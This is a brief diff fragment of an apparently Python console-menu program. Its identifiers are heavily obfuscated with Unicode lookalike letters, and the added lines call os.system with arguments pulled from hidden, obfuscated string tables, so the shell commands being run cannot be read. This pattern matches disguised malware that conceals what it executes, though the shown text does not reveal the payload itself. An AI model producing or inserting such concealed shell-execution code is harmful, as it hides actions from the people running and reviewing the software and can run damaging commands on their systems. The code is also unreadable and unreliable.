-        𝘰𝙨.system(𝘕𝘔𝗠𝙈𝘕𝗹𝗹𝙈𝗠𝙡𝙈𝗠𝙉𝘭𝗜𝘔𝗜𝙄𝘕𝘔𝗜𝘐𝙈𝗜𝗹𝘐𝙉𝗜𝘔𝙄𝗜𝗠[412])
-        𝗰𝘰𝘯𝘴𝙤𝘭𝗲.render_ascii()
-        𝗲𝘹𝗶𝙩()
-if __𝘯𝙖𝘮𝗲__ == 𝗡𝗠𝗠𝙈𝙉𝘭𝗹𝗠𝙈𝘭𝘔𝙈𝙉𝘭𝘐𝘔𝗜𝙄𝙉𝙈𝘐𝘐𝘔𝙄𝗹𝘐𝗡𝘐𝙈𝙄𝘐𝗠[413]:
-    𝙈𝗲𝗻𝙪().main_menu()
+        𝘰𝘴.system(𝙄𝙉𝙄𝗡𝗹𝘭𝘐𝗠𝗜𝙄𝙡𝘔𝙡𝘭𝘐𝘭𝙡𝗡𝗡𝗜𝙡𝙡𝙈𝘕𝙡𝗡𝙡𝘔𝘐𝘔𝗜𝗠[1])
+        𝘰𝘀.system(𝘐𝗡𝗜𝗡𝙡𝘭𝗜𝘔𝗜𝘐𝙡𝘔𝗹𝙡𝗜𝗹𝙡𝙉𝙉𝙄𝗹𝙡𝘔𝗡𝗹𝙉𝙡𝗠𝘐𝗠𝗜𝗠[405])
+        𝘤𝘰𝗻𝘀𝗼𝘭𝘦.render_ascii()
+        𝗲𝙭𝘪𝙩()
+
+if __𝗻𝘢𝘮𝙚__ == 𝘐𝙉𝘐𝘕𝘭𝗹𝗜𝙈𝙄𝙄𝗹𝙈𝘭𝙡𝙄𝘭𝙡𝙉𝗡𝙄𝙡𝗹𝘔𝗡𝗹𝘕𝙡𝗠𝘐𝙈𝗜𝗠[406]:
+    𝗠𝘦𝘯𝙪().main_menu()
